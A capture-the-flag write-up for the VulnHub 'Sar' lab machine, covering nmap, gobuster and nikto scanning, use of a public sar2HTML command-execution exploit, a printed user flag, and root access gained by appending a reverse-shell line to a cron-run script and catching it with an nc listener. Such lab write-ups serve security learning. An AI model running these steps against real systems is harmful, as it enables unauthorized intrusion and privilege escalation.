# VulnHub Walkthrough: Sar

Sar Walkthrough

### Details
* Name: Sar ([VulnHub](https://www.vulnhub.com/entry/sar-1,425/))
* Goal: Get root and read 2 flags

### Initial Network Scan
```bash
sudo netdiscover
```
From the network scan we find that the target IP is `192.168.1.10`.

### Network Scan
Now we lok into doing a more indepth scan of the target machine to locate any open ports.

```bash
# Scan ports 0-65535
nmap -A -p0-65535 192.168.1.10
```

From here, because I saw that port 80 was open, I decided to run a more in-depth nmap scan to enumerate HTTP.

```bash
# Scan all ports, enumerate HTTP, etc.
sudo nmap -sC -sV -A -O -p- -T4 -script http-enum 192.168.1.10
```

### HTTP directory enumeration

Before I start exploring the website, I want to run a gobuster, nikto, and dirb scan to see if there are any hidden directories.
```bash
# Gobuster scan: Big wordlist
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -e -t 20 -u http://192.168.1.10

# Nikto scan
nikto -h http://192.168.1.10

# dirb scan
dirb http://192.168.1.10
```

From the scans, we find a `/robots.txt` directory. When we explore this page (http://192.168.1.10/robots.txt), we find a hidden directory `sar2HTML`.

From here we can once again try scanning the site with our tools.
```bash
# Gobuster scan: Big wordlist
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -e -t 20 -u http://192.168.1.10/sar2HTML

# Nikto scan
nikto -h http://192.168.1.10/sar2HTML

# dirb scan
dirb http://192.168.1.10/sar2HTML
```

From the nikto scan we find something interesting
```text
+ /sar2HTML/index.php?module=ew_filemanager&type=admin&func=manager&pathext=../../../etc: EW FileManager for PostNuke allows arbitrary file retrieval.
```


### Vulnerability

I went ahead and did a quick search on searchsploit to see if I could find anything of use.
Surely enough, when I searched for "sar2HTML", I found a vulnerability that allows for arbitrary file retrieval.
```bash
# Search for exploit
searchsploit sar2HTML

# Download the python exploit
searchsploit -m 49344

# Download the text exploit
searchsploit -m 47204
```

After looking through both of the exploits, I essentially determined that explain the same thing.
I decided to go with the python exploit since it makes things much easier to do, in terms of running the exploit.
```bash
# Run the python exploit
python3 49344.py

## Enter the website: http://192.168.1.10/sar2HTML
```

Boom we're (sort of in)

### Exploring the system

Once in, I decided to immediately go check the `home` directory to see if there was anything of use.

Fortunately I was able to find something within the users `love` directory
```bash
# Check for any users
ls -halt /home

# Check the love directory
ls -halt /home/love/*

# We discover a "user.txt" file
cat /home/love/user.txt
```

The `user.txt` file contains the following:
```text
427a7e47deb4a8649c7cab38df232b52
```
This is the user flag.

### Privilege Escalation

From here I explored the `/var/www/html` directory and found 2 interesting files:
* finally.sh
* write.sh

finally.sh
```bash
#!/bin/bash

./write.sh
```

write.sh
```bash
#!/bin/bash

touch /tmp/gateway
```

So in summary, we can tell that the `finally.sh` script is running the `write.sh` script.

## Cron Jobs

Through some digging we find out that there is a cronjob running every five minutes that will execute the `finally.sh` script as sudo.
```bash
# Search through cron job
cat /etc/crontab
```

From here we know that all we need to do is edit the `write.sh` script to run a reverse shell.

So we will append a reverse shell to the `write.sh` script. More specifically we will just use the php script we uploaded earlier to give us the first backdoor shell.
```bash
# append the line to the write.sh script
echo "php ./sar2HTML/shell.php" >> ./write.sh
```

From here we just need to wait for the cron job to run and we will have a reverse shell.
```bash
# Start a listener
nc -lvnp 9001
```

After waiting a few minutes, we get a reverse `root` shell.
